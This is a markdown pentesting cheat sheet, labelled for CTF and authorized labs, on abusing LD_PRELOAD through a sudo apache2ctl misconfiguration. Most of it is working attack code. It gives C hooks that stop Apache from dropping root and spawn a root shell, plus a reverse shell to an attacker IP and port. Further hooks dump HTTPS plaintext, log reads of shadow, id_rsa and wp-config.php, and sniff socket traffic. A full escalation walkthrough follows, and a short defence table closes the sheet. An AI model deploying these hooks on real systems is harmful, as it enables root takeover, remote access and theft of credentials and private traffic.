# 🔥 LD\_PRELOAD Apache Exploitation — Pentesting Notes - (..beta..)

> **Scope:** CTF / authorized lab environments only. Unauthorized use is illegal.

---

## What Is LD\_PRELOAD?

`LD_PRELOAD` is a Linux environment variable that forces the dynamic linker to load a specified shared object **before all others** — including libc. This lets you override any libc/library symbol in a target binary at runtime.

**Why Apache?**
- Apache often starts as `root` before dropping privileges via `setuid()`/`setgid()`
- `apache2ctl` is a common `sudo` misconfiguration target
- The window between start and privilege drop is exploitable

---

## ⚙️ Compilation Reference

```bash
# Basic shared object
gcc -fPIC -shared -o hook.so hook.c -ldl

# With debug symbols (useful during dev)
gcc -fPIC -shared -g -o hook.so hook.c -ldl

# Suppress linker warnings about missing main
gcc -fPIC -shared -nostartfiles -o hook.so hook.c -ldl

# Cross-compile for 32-bit target on 64-bit host
gcc -m32 -fPIC -shared -o hook32.so hook.c -ldl

# Test locally
LD_PRELOAD=$PWD/hook.so ./target_binary
```

**Flags explained:**

| Flag | Purpose |
|---|---|
| `-fPIC` | Position-Independent Code — required for shared libs |
| `-shared` | Produce a `.so` instead of an executable |
| `-ldl` | Link libdl for `dlsym()` / `dlopen()` |
| `-nostartfiles` | Skip standard startup (avoids `main` warnings) |

---

## 🪝 Hook Templates

### 1. strcmp Hook — Classic CTF/Password Leak

Intercepts string comparisons — useful for dumping hardcoded passwords or bypassing auth checks.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

int strcmp(const char *s1, const char *s2) {
    static int (*orig_strcmp)(const char *, const char *) = NULL;
    if (!orig_strcmp)
        orig_strcmp = dlsym(RTLD_NEXT, "strcmp");

    printf("[HOOK] strcmp('%s', '%s')\n", s1, s2);
    fflush(stdout);
    return orig_strcmp(s1, s2);
}

// Also hook strncmp for completeness
int strncmp(const char *s1, const char *s2, size_t n) {
    static int (*orig)(const char *, const char *, size_t) = NULL;
    if (!orig)
        orig = dlsym(RTLD_NEXT, "strncmp");

    printf("[HOOK] strncmp('%s', '%s', %zu)\n", s1, s2, n);
    fflush(stdout);
    return orig(s1, s2, n);
}
```

> **Tip:** Use `fflush(stdout)` — Apache redirects stdout and output may be buffered.

---

### 2. setuid/setgid Hook — Privilege Retention

Prevents Apache from dropping root. The `constructor` attribute runs your payload **before `main()`**.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

// Block privilege drop
int setuid(uid_t uid) {
    printf("[HOOK] Blocked setuid(%d) — staying root.\n", uid);
    fflush(stdout);
    return 0;
}

int setgid(gid_t gid) {
    printf("[HOOK] Blocked setgid(%d) — staying root.\n", gid);
    fflush(stdout);
    return 0;
}

// Also cover the 32-bit variants (used on some kernels)
int setuid32(uid_t uid) { return setuid(uid); }
int setgid32(gid_t gid) { return setgid(gid); }

// Runs before Apache's main() — spawns root shell immediately
__attribute__((constructor))
void pwn(void) {
    printf("[HOOK] Constructor executing as uid=%d\n", getuid());
    fflush(stdout);
    // -p: preserve effective uid in bash
    system("/bin/bash -p");
}
```

> **Note:** `system()` spawns a subshell. For a more stable session, use `execve()` directly or a reverse shell one-liner.

---

### 3. Reverse Shell via Constructor

More reliable than `system("/bin/bash")` in headless/daemonized Apache contexts:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define LHOST "10.10.14.5"
#define LPORT 4444

__attribute__((constructor))
void reverse_shell(void) {
    int sock;
    struct sockaddr_in sa;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        return;

    // Redirect stdin/stdout/stderr to socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *argv[] = { "/bin/bash", "-p", NULL };
    execve("/bin/bash", argv, NULL);
}
```

```bash
# Listener on attacker box
nc -lvnp 4444
```

---

### 4. SSL\_write Inspector — Decrypt HTTPS in Flight

Hook OpenSSL's write path to dump plaintext **before** encryption.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <openssl/ssl.h>

// Log file path (writable by Apache process)
#define LOG_PATH "/tmp/.ssl_dump.log"

int SSL_write(SSL *ssl, const void *buf, int num) {
    static int (*orig)(SSL *, const void *, int) = NULL;
    if (!orig)
        orig = dlsym(RTLD_NEXT, "SSL_write");

    FILE *f = fopen(LOG_PATH, "a");
    if (f) {
        fprintf(f, "[SSL_write len=%d]\n", num);
        fwrite(buf, 1, num, f);
        fprintf(f, "\n---\n");
        fclose(f);
    }

    return orig(ssl, buf, num);
}

// Also hook SSL_read to capture inbound traffic
int SSL_read(SSL *ssl, void *buf, int num) {
    static int (*orig)(SSL *, void *, int) = NULL;
    if (!orig)
        orig = dlsym(RTLD_NEXT, "SSL_read");

    int ret = orig(ssl, buf, num);
    if (ret > 0) {
        FILE *f = fopen(LOG_PATH, "a");
        if (f) {
            fprintf(f, "[SSL_read len=%d]\n", ret);
            fwrite(buf, 1, ret, f);
            fprintf(f, "\n---\n");
            fclose(f);
        }
    }
    return ret;
}
```

```bash
# Compile (requires OpenSSL headers)
gcc -fPIC -shared -o ssl_hook.so ssl_hook.c -ldl -lssl -lcrypto

# Monitor live
tail -f /tmp/.ssl_dump.log
```

---

### 5. open() Interceptor — File Access Monitor

Logs every file Apache opens. Useful for config discovery and credential hunting.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <fcntl.h>
#include <dlfcn.h>

#define LOG "/tmp/.open_hook.log"

// Targets to highlight
static const char *interesting[] = {
    "httpd.conf", "apache2.conf", "ssl.conf",
    ".htpasswd", "php.ini", "wp-config.php",
    "id_rsa", "shadow", NULL
};

int open(const char *pathname, int flags, ...) {
    static int (*orig)(const char *, int, ...) = NULL;
    if (!orig)
        orig = dlsym(RTLD_NEXT, "open");

    // Forward variadic mode arg if O_CREAT is set
    va_list ap;
    va_start(ap, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(ap, mode_t) : 0;
    va_end(ap);

    FILE *f = fopen(LOG, "a");
    if (f) {
        fprintf(f, "[open] %s\n", pathname);
        for (int i = 0; interesting[i]; i++) {
            if (strstr(pathname, interesting[i]))
                fprintf(f, "  *** INTERESTING: %s ***\n", interesting[i]);
        }
        fclose(f);
    }

    return orig(pathname, flags, mode);
}
```

---

### 6. send() / recv() Network Sniffer

Dump raw HTTP traffic at the socket layer.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <dlfcn.h>

#define LOG "/tmp/.net_hook.log"
#define MAX_DUMP 4096

static void log_traffic(const char *dir, const void *buf, size_t len) {
    FILE *f = fopen(LOG, "a");
    if (!f) return;
    size_t dump_len = len > MAX_DUMP ? MAX_DUMP : len;
    fprintf(f, "[%s len=%zu]\n", dir, len);
    fwrite(buf, 1, dump_len, f);
    if (len > MAX_DUMP)
        fprintf(f, "\n... (truncated) ...\n");
    fprintf(f, "\n---\n");
    fclose(f);
}

ssize_t send(int fd, const void *buf, size_t len, int flags) {
    static ssize_t (*orig)(int, const void *, size_t, int) = NULL;
    if (!orig)
        orig = dlsym(RTLD_NEXT, "send");
    log_traffic("SEND", buf, len);
    return orig(fd, buf, len, flags);
}

ssize_t recv(int fd, void *buf, size_t len, int flags) {
    static ssize_t (*orig)(int, void *, size_t, int) = NULL;
    if (!orig)
        orig = dlsym(RTLD_NEXT, "recv");
    ssize_t ret = orig(fd, buf, len, flags);
    if (ret > 0)
        log_traffic("RECV", buf, (size_t)ret);
    return ret;
}
```

---

## 🧩 Exploiting apache2ctl via sudo Misconfiguration

### Identify the Misconfiguration

```bash
sudo -l
# Look for:
# (ALL) NOPASSWD: /usr/local/bin/apache2ctl
# (ALL) NOPASSWD: /usr/sbin/apache2ctl
```

### Check if LD\_PRELOAD is preserved in sudoers

```bash
sudo -l | grep -i env_keep
# Target: env_keep += LD_PRELOAD
# Or: SETENV in the rule
```

There are two scenarios:

**Scenario A — `env_keep+=LD_PRELOAD` in sudoers (most common CTF setup):**
```bash
sudo LD_PRELOAD=/tmp/hook.so apache2ctl start
```

**Scenario B — `SETENV` flag on the rule:**
```bash
# sudoers line looks like:
# user ALL=(ALL) SETENV: NOPASSWD: /usr/sbin/apache2ctl
sudo LD_PRELOAD=/tmp/hook.so apache2ctl start
```

**Scenario C — No env preservation (bypass attempt):**
```bash
# Wrap in a script apache2ctl calls
# Or use apache2 -f to point at a malicious config that sets env vars
```

---

## ⚡ Full Attack Walkthrough

### Step 1 — Write & Compile

```bash
cat > /tmp/hook.c << 'EOF'
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int setuid(uid_t u) { return 0; }
int setgid(gid_t g) { return 0; }

__attribute__((constructor))
void pwn(void) { system("/bin/bash -p"); }
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/hook.so /tmp/hook.c -ldl
chmod 755 /tmp/hook.so
```

### Step 2 — Verify the .so

```bash
file /tmp/hook.so
# ELF 64-bit LSB shared object ...

nm -D /tmp/hook.so | grep -E "setuid|setgid|pwn"
# Should list your symbols
```

### Step 3 — Fire

```bash
sudo LD_PRELOAD=/tmp/hook.so apache2ctl start
# Root shell pops before Apache finishes init
```

### Step 4 — Stabilize Shell (if needed)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 🛡️ Detection & Defenses (Blue Team Context)

| Defense | How It Mitigates |
|---|---|
| `secure_path` in sudoers | Restricts PATH — not LD\_PRELOAD directly |
| Remove `env_keep+=LD_PRELOAD` | Sudo won't propagate the variable |
| Run Apache as non-root from start | No privilege drop = no setuid hook window |
| Use systemd unit with `NoNewPrivileges=yes` | Blocks setuid/setgid tricks |
| AppArmor / SELinux profile | Prevents loading arbitrary `.so` files |
| `LD_PRELOAD` is ignored for SUID binaries | Kernel strips it automatically |
| Audit logging: `auditctl -w /etc/ld.so.preload` | Alerts on preload file writes |

---

## 🧹 Cleanup

```bash
rm -f /tmp/hook.so /tmp/hook.c
rm -f /tmp/.ssl_dump.log /tmp/.open_hook.log /tmp/.net_hook.log
unset LD_PRELOAD
# Check for persistence
cat /etc/ld.so.preload
```

---

## 📋 Quick Reference

```text
GOAL                    HOOK TARGET         NOTES
─────────────────────────────────────────────────────────────
Stay root               setuid / setgid     Block privilege drop
Instant shell           constructor attr    Runs before main()
Stable reverse shell    constructor attr    Use execve not system
Dump HTTPS plaintext    SSL_write/read      Needs -lssl -lcrypto
Monitor file access     open / openat       Include openat too
Sniff HTTP traffic      send / recv         Raw socket layer
Bypass auth checks      strcmp / strncmp    Dump or return 0
```

